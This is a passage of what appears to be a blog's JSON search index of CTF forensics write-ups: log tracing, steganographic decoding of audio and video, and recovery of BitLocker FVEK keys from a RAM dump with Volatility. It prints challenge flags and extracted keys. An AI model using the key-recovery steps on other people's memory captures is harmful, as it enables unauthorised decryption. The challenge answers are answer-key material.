these sites.\n\nLet's analyze the syslog:\n\n```json\n{\"host\": \"primary\", \"source\": \"udp:514\", \"sourcetype\": \"syslog\", \"_time\": \"2024-12-04 04:58:36.95\", \"data\": {\"_raw\":

address and found the name of the employee associated with it: `llloyd`.\n\n##### Creating the Flag\nWith the gathered information, I constructed the flag using the defined format, and boom, that was the correct flag.\n\nFlag:\n\n```yaml\nirisctf{llloyd}\n```\n\n### Tracem2\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/tracem2/desc.png)\n\nSource File: [tracem-2.tar.gz](/images/posts/2025-irisctf/forensics/tracem2/tracem-2.tar.gz)\n\nYeah some of the teams had 600+ and 1300+ attempts.😂\n#### Solution\n\nThis challenge is a continuation of the Tracem1 challenge. For better context, you can refer to my Tracem1 write-up. Unfortunately, I was only able to solve this challenge partially during the CTF duration 🥹. I delved too deeply into analysis and missed a critical clue. However, I’ll share all the data and steps I took while solving it.\n \n##### Challenge Overview\nWe received a logs.json file for this challenge. Similar to Tracem1, I began analyzing the logs.\n\nHere are some notable sites accessed in the logs.json file:\n\n```yaml\ndetectportal.firefox.com\nwww.msftconnecttest.com\n.\n3.fedora.pool.ntp.org\n0.arch.pool.ntp.org\nglobo.com\nreg.ru\n1.ubuntu.pool.ntp.org\npolitico.com\nenable-javascript.com\nmozilla.com\nfb.me\n20minutos.es\nlast.fm\nxda-developers.com\nunicef.org\nnypost.com\ntarget.com\nkickstarter.com\n2.arch.pool.ntp.org\n.\ngitlab.evil-insurance.corp\nhr.evil-insurance.corp\nfiles.evil-insurance.corp\nmeetings.evil-insurance.corp\nit.evil-insurance.corp\nevil-insurance.corp\nchat.evil-insurance.corp\nservice.evil-insurance.corp\nguestportal.evil-insurance.corp\nsso.evil-insurance.corp\nevil-insurance.corp\n.\nubuntu.com\nthepiratebay.org\ngeneric-illicit-activities-hub.org\ndeloitte.com\nbp0.blogger.com\n```\n\nThese two sites seemed suspicious:\n\n- thepiratebay.org\n- generic-illicit-activities-hub.org\n\nI then identified the user who accessed both sites:\n\n```bash\n$ strings logs.json | grep -E

null}]}}\n```\n\n##### Suspicious User Identification\n\nThe suspicious user had the following attributes:\n\n```\nIP Address: 10.18.21.121\nMAC Address: de:ad:be:ef:ca:fe (a spoofed address)\n```\n\n###### Activity Timeline of the Suspicious User\n\n| Event                          | Time of the event             |\n|--------------------------------|-------------------------------|\n| Req for the addr 10.18.21.121  | 2024-12-04 08:49:20.52        |\n| Get assigned that addr         | 2024-12-04 08:49:21.00        |\n| Access www.google.com          | 2024-12-04 08:49:34.58        |\n| Access 2.arch.pool.ntp.org     | 2024-12-04 08:51:18.72        |\n| Access thepiratebay.org        | 2024-12-04 08:51:51.12        |\n| Access generic-illicit-activities-hub.org| 2024-12-04 09:05:01.12|\n| Releases the IP addr           | 2024-12-04 09:22:01.12        |\n\n\nThis was another challenge in the Tracem series, so it wasn’t going to be straightforward to solve via syslog logs. Additionally, the suspicious IP (10.18.21.121) didn’t have any corresponding syslog logs, making direct identification of the user more difficult.\n\nSince I had already established that the suspicious IP (10.18.21.121) was the only one to access the two suspicious sites (thepiratebay.org and generic-illicit-activities-hub.org), I decided to investigate further.\n\nTo narrow down potential leads, I began analyzing who else accessed 2.arch.pool.ntp.org.\n\nI got these result:\n\n```\n10.50.103.29\n10.66.91.95\n10.66.68.75\n10.17.161.10\n10.34.192.28\n10.65.26.90\n10.65.68.160\n10.51.64.145\n10.66.156.255\n10.35.126.228\n10.67.252.116\n10.17.6.47\n10.50.184.143\n10.18.21.121\n10.49.220.32\n10.49.79.62\n10.49.65.21\n10.17.90.14\n10.17.26.247\n10.17.171.253\n10.65.228.127\n```\n\n##### Initial Misstep\nAt this point, I noticed that the user accessed 2.arch.pool.ntp.org, a relatively common URL. I assumed it wasn’t suspicious and did not cross-reference other IPs that accessed this site during the same timeframe. This was my critical oversight.\n\nFeel free to skip the rest if you'd like—I’ll now share what I explored after this step.\n\n##### Investigation Details\n\n###### Extraction and Analysis\n\n1. MAC Addresses:\n\nI extracted all MAC addresses to look for other spoofed addresses but found no results.\n\n2. IP Segmentation:\n\nI identified recurring IP ranges in the logs:\n\n```\n10.17.X.X\n10.18.X.X\n10.19.X.X\n10.33.X.X\n10.34.X.X\n10.35.X.X\n10.49.X.X\n10.50.X.X\n10.51.X.X\n10.65.X.X\n10.66.X.X\n10.67.X.X\n```\n\n3. Syslog SSO Logs:\n\nOnly the following IP ranges appeared in syslog SSO logs:\n\n```\n10.17.X.X\n10.19.X.X\n10.33.X.X\n10.35.X.X\n10.49.X.X\n10.51.X.X\n10.65.X.X\n10.67.X.X\n```\n\nSo it was certain that I would get the username from this set of IPs.\n\nLooking at these IPs, I thought this challenge might be based on Network Segmentation. It appeared that there were four buildings and three subnets, which Skat later confirmed on Discord.\n\n4. Network Proximity Assumptions:\n\nI hypothesized that the suspicious user might have moved laterally to a new subnet, maintaining the same host/octet structure.\n\nFrom 10.17.X.X and 10.19.X.X:\n\n- Likely Subnets: 10.17.21.xxx, 10.17.121.xxx, etc.\n- Likely Hosts: 10.17.x.121.\n\nDespite exploring these, I found no leads.\n\nThen I moved on to checking the full logs.json file around the timeline of the IP guy. By this time, this challenge was my last one left, and I was very tired, so I couldn’t search properly.\n\n##### Aftermath\n\nAfter the CTF Competition, Jakob (discord) mentioned that I should have checked the IPs accessing 2.arch.pool.ntp.org around the timeline of the suspicious user (10.18.21.121).😿\n\n[Jakob's Tracem2 Writeup](https://team-bytesized.github.io/ctf/iris2025/writeups/tracem-2.html)\n\n###### Key Table (from Jakob's Write-Up):\n\n| Timestamp                  |              Events |                    Notes|\n|----------------------------|---------------------|--------------------------|\n| 2024-12-04 08:45:33.555166 | 10.17.161.10 ( mhammond ) disconnects from network | releases 10.17.161.10 + pause in traffic from 10.17.161.10 |\n| 2024-12-04 09:42:00.907257 | IP assignment to 10.17.161.10 ( mhammond ) | traffic from 10.17.161.10 continues |\n\n\nThis IP (10.17.161.10) was the closest to the suspicious user's timeline. The username associated with this IP was `mhammond`, making them the culprit.\n\nFlag:\n\n```yaml\nirisctf{mhammond}\n```\n\n#### Reflection\nThis challenge reinforced the importance of checking all data points and avoiding assumptions during investigations. Despite missing the critical clue during the competition, I gained valuable insights and improved my analysis techniques.\nThanks `skat` for the cool challenges.\n","tags":["networking","forensics","volatility","osint"],"categories":["CTF-Writeups"]},{"title":"BCACTF 5.0 2024","url":"/2024/06/12/BCACTF-5-0-2024/","content":"\nBCACTF 5.0!\n\nReturning for its fifth consecutive year, this high school CTF hosted by the Bergen County Academies offers challenges across various difficulty levels, catering to everyone from beginners to seasoned CTF veterans.\n\nI had the opportunity to participate in BCACTF 2024 as a member of my institute's club, InfoSecIITR. Our team secured 7th Place globally. These writeups document the challenges I personally solved during the competition. The remaining challenges were tackled by my teammates.\n\n## Forensics\n\n### *Mysterious Melody*\n\n#### Challenge Description\n\n![Description](/images/posts/2024-bcactf/desc.png)\n\nWe have received a WAV file.\n\n#### Solution\n\nSo, I opened the WAV file using Sonic Visualizer software. Initially, I was unsure of what to do after examining the Spectrogram. Then, I analyzed the melody range spectrogram and the peak frequency spectrogram.\n\n```Text\nYou can add the Spectrogram, Melody Range Spectrogram, and Peak Frequency Spectrogram from the Pane menu.\n```\n\n![Spectrogram](/images/posts/2024-bcactf/spec_melody.png)\n![Peak](/images/posts/2024-bcactf/peak.png)\n\nWhere I noticed something unusual that resembled Morse code, but it wasn't. On the left side, there were 16 increasing lines, which matched the base16 hint provided. The hex values for the start of the flag 'bcactf{' corresponded to the highs and lows of the lines on the right side. This clue confirmed it was part of the flag, and from there, we decoded all the highs and lows.\n\n`6263616374667B62656175746966756C5F6D656C6F64795F62656175746966756C5F6861726D6F6E797D`\n\n#### Flag\n\n`bcactf{beautiful_melody_beautiful_harmony}`\n\n### *Static*\n\n#### Challenge Description\n\n![Desc](/images/posts/2024-bcactf/desc_static.png)\n\nWe have received a MP4 file and the MD5 of a file.\n\n#### Solution\n\nAs the hints suggested, I began searching for the metadata.\n\n```bash\n$ exiftool static.mp4\nCompressor Name                 : Lavc60.31.102 libx264rgb\nEncoder                         : StaticMaker https://shorturl.at/AUKZm\n```\n\nTwo things seemed sus to me: the Compressor and the Encoder. I then checked the above link for StaticMaker and realized they provided a documentation file with information about the StaticMaker software.\n\n```Text\nThe StaticMaker ™ utility converts any binary file into a video, suitable for use in … some application somewhere, probably.\nThe default configuration is width=256, height=256.\n\nThe program works by:\n1. Compressing the data\n2. Padding to a size that is a multiple of (6*width*height) bits\n3. Splitting the data into “subframes” of size (2*width*height) bits\n4. Writes data to video frames, which each triplet of three consecutive subframes are written to the red, green, and blue channels of one frame, respectively\n     Data written in row-major order\n     2 bits per pixel per channel\nTHE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\n```\n\nWorkFlow:- \n1. Extraction of Frames:\n    Utilizes FFmpeg to extract frames from the video.\n\n2. Extraction of Pixel Data:\n    Decodes the RGB channels of each frame.\n    Extracts 2 bits per pixel per channel\n    \n3. Reconstruction of Binary Data:\n   Combines the extracted bits into a single stream.\n   Reconstructs the original binary data by converting the bits back into bytes.\n\nFor Extraction of Frames:-\n\n```bash\n$ ffmpeg -i static.mp4 frame_%04d.png\n```\n\nUsing ffmpeg, we extracted 72 frames in PNG format from the MP4 video.\n\n![Image 2](/images/posts/2024-bcactf/frames.png)\n\nNext, I wrote a Python script to accomplish steps 2 and 3.\n\n```python\nimport hashlib\nfrom PIL import Image\nimport numpy as np\n\ndef decode_frames(frame_prefix, frame_count, width=256, height=256):\n    channels = ['R', 'G', 'B']\n    bit_position = 4  # Bit position(4or6) chosen based on successful MD5 checksum match, were taken bitpositions [2,4,6,8]\n    \n    data_bits = []\n    for frame_idx in range(1, frame_count + 1):\n        frame_path = f\"{frame_prefix}{frame_idx:04d}.png\"\n        frame = Image.open(frame_path)\n        frame = frame.convert(\"RGB\")\n        pixels = np.array(frame)\n        \n        # Extract the specified bits from each color channel\n        r_channel = (pixels[:, :, 0] & (0b11 << bit_position)) >> bit_position\n        g_channel = (pixels[:, :, 1] & (0b11 << bit_position)) >> bit_position\n        b_channel = (pixels[:, :, 2] & (0b11 << bit_position)) >> bit_position\n        \n        # Flatten the channels and convert to bit strings\n        for bits in r_channel.flatten():\n            data_bits.append(format(bits, '02b'))\n        for bits in g_channel.flatten():\n            data_bits.append(format(bits, '02b'))\n        for bits in b_channel.flatten():\n            data_bits.append(format(bits, '02b'))\n    return ''.join(data_bits)\n\ndef check_padding(data_bits, width, height):\n    size = 6 * width * height\n    print(\"The size is\", size)\n    actual_size = len(data_bits)\n    print('The actual size is ', actual_size)\n    if actual_size % size == 0:\n        print(\"Multiple of size\")\n        # No padding to remove\n        return data_bits   # size was already in multiple so need for removing the padding.\n    \n    # Calculate the number of excess bits to remove\n    padding_size = actual_size % size\n    \n    # Remove the excess bits\n    data_bits = data_bits[:-padding_size]\n    return data_bits\n\ndef bits_to_bytes(data_bits):\n    byte_arr = bytearray()\n    for i in range(0, len(data_bits), 8):\n        byte = data_bits[i:i+8]\n        byte_arr.append(int(byte, 2))\n    return bytes(byte_arr)\n\ndef calculate_md5(data):\n    md5 = hashlib.md5(data).hexdigest()\n    return md5\n\n# Parameters\nframe_prefix = 'frame_'\nframe_count = 72  # Total number of frames\nwidth = 256\nheight = 256\n\n# Decode frames\ndata_bits = decode_frames(frame_prefix, frame_count, width, height)\n\n# Checking padding\ndata_bits = check_padding(data_bits, width, height)\n\n# Convert bits to bytes\ncompressed_data = bits_to_bytes(data_bits)\n\noutput_path = 'extracted_data.bin'\nwith open(output_path, 'wb') as f:\n    f.write(compressed_data)\nprint(\"Extracted data saved.\")\n\n# Calculate and print MD5 checksum\ncalculated_md5 = calculate_md5(compressed_data)\nprint(f\"MD5 checksum of extracted data after removing padding: {calculated_md5}\")\n\n```\n\nThe extracted bin matches the MD5 checksum provided in the description. As I began analyzing the file, I employed several tools. When I used binwalk, it indicated the presence of Zlib compressed data, which I then extracted.\n\n```bash\n$ binwalk -e extracted_data.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n40522         0x9E4A          Zlib compressed data, default compression\n\n```\n\nThere are two approaches: one is quick and easy, while the other is little time-consuming. \nThis is the quick and easy method for lazy people like me to get the flag.\n\n```bash\ng4rud4:~/Pictures/_extracted_data.bin.extracted$ ls\n9E4A  9E4A.zlib\ng4rud4:~/Pictures/_extracted_data.bin.extracted$ strings * | grep bcactf{\nbootpc[[ --bootfile %bootfile%]] --dev %iface%[[ --server %server%]][[ --hwaddr %hwaddr%]] --returniffail --serverbcast\ncan't enable bcast on ARP socket\nbcache\nsbcast\nnulsohstxetxeotenqackbel bs ht nl vt ff cr so sidledc1dc2dc3dc4naksynetbcan emsubesc fs gs rs us sp\nhttp-alt    8080/tcp    webcache    # WWW caching service\nTTJvQS8TUoKU1xrBeKJR3Stwbbca+few4GeXVtt8YVMJAygCQMez2P2ccGrGKMOF\nbcactf{imag3_PROc3sSINg_yaY_2ea104d700c1a8}\n``` \n\nAnother one is to do it proper way:- \n\n```bash\n$ zlib-flate -uncompress < 9E4A.zlib > output\n$ exiftool output\n$ file output\noutput: POSIX tar archive\n```\n\nI began extracting the tar archive once we obtained it.\n\n```bash\n$ tar -xf output\n$ ls\nbin  dev  etc  home  lib  out\n```\n\nWe got some folders let's check out \n\n```bash\n$ tree .\n.\n├── bin\n│   ├── arch -> /bin/busybox\n│   ├── ash -> /bin/busybox\n│   ├── base64 -> /bin/busybox\n│   ├── bbconfig -> /bin/busybox\n...\n├── home\n│   └── admin\n│       └── Documents\n│           ├── not_social_security_number.txt\n│           └── social_security_number.txt\n└── lib\n    ├── apk\n    │   ├── db\n    │   │   ├── installed\n    │   │   ├── lock\n    │   │   ├── scripts.tar\n    │   │   └── triggers\n    │   └── exec\n    ├── firmware\n    ├── ld-musl-x86_64.so.1\n    ├── libapk.so.2.14.0\n    ├── libc.musl-x86_64.so.1 -> ld-musl-x86_64.so.1\n    └── libcrypto.so.3\n\n45 directories, 145 files\n```\n\nI began searching for the text files in the admin directories.\n\n```bash\n~/home/admin/Documents$ cat not_social_security_number.txt\nbcactf{imag3_PROc3sSINg_yaY_2ea104d700c1a8}\n```\n\nHooray!!! We captured the flag just 3 minutes before the CTF ended. ;p\n\n#### Flag\n\n`bcactf{imag3_PROc3sSINg_yaY_2ea104d700c1a8}`\n","tags":["forensics"],"categories":["CTF-Writeups"]},{"title":"BYUCTF 2024","url":"/2024/05/20/BYUCTF-2024/","content":"\nBYUCTF 2024!\n\nI participated in BYUCTF 2024, organized by BYU Cyberia, as a member of my institute's club, InfoSecIITR.

I've been BitLockered out of my own computer!\n\n#### Challenge Description\n\nInstall Bitlocker they said... it will protect your data they said... Well, now I don't have access to any of my data because I forgot my password... again! Can you find my FVEK keys? I managed to capture my RAM so they should be in there\n\nFlag format - `byuctf{key1_key2_key3}` (order not significant)\n\n* Mirror 1 - https://byu.box.com/s/paexcd1t1er8bj435gg88i52q9ho8ftf\n* Mirror 2 - https://drive.google.com/file/d/1EAYpFu0ULc4fGt2qNoJTaNvG4F9A8Vw7/view?usp=sharing\n\n#### Solution\n\nAs the user has captured the RAM, provided to us as the 20240327.mem file, I started searching for BitLocker. We found a plugin for the [Volatility2](https://github.com/volatilityfoundation/volatility) tool at [GitHub Repo](https://github.com/breppo/Volatility-BitLocker). Since the file is also a memory file, it was straightforward to use the plugin.\n\nFirst, we needed the profile, so I used the following command in my terminal(using Volatility2):\n\n```bash\n$ python2 vol.py -f 20240327.mem imageinfo\n```\n\nIt took a lot of time about 7-8 minutes—but eventually, it provided the profile `Win10x64_19041`. After that, I used the BitLocker plugin:\n\n```bash\n$ python2 vol.py -f 20240327.mem --profile=Win10x64_19041 bitlocker\n```\n\nWe got 5 FVEK keys, but after trying some possible combinations, I realized only Win8+ was accepted.\n\nI've provided the solution's image.\n\n![Solution](/images/posts/2024-byuctf/not_again.png)\n\n#### Flags\n\n```Text\nbyuctf{968052b6b247b32f6cfecce39749785f_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_91d4cceb5bf238cb3cb96367314773f5}\nbyuctf{968052b6b247b32f6cfecce39749785f_91d4cceb5bf238cb3cb96367314773f5_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b}\nbyuctf{91d4cceb5bf238cb3cb96367314773f5_968052b6b247b32f6cfecce39749785f_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b}\nbyuctf{91d4cceb5bf238cb3cb96367314773f5_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_968052b6b247b32f6cfecce39749785f}\nbyuctf{91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_91d4cceb5bf238cb3cb96367314773f5_968052b6b247b32f6cfecce39749785f}\nbyuctf{91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_968052b6b247b32f6cfecce39749785f_91d4cceb5bf238cb3cb96367314773f5}\n```\n\n","tags":["forensics","volatility"],"categories":["CTF-Writeups"]},{"title":"About","url":"/about/index.html","content":"\n<p align=\"center\">\n  <img src=\"https://readme-typing-svg.herokuapp.com?font=Jersey+10&size=30&duration=4000&pause=1000&color=ffffff&center=true&vCenter=true&width=800&height=100&lines=Welcome+to+my+profile+>_<;Always+Learning!\" alt=\"Typing SVG\">\n</p>\n\n<h2> whoami </h2>\n\n- I am a student at **IIT Roorkee** with a keen interest in *cybersecurity* and *software development*. \n\n- I actively participate in CTF competitions, honing my skills in ***Digital Forensics, Networking, and Malware Reversing***.
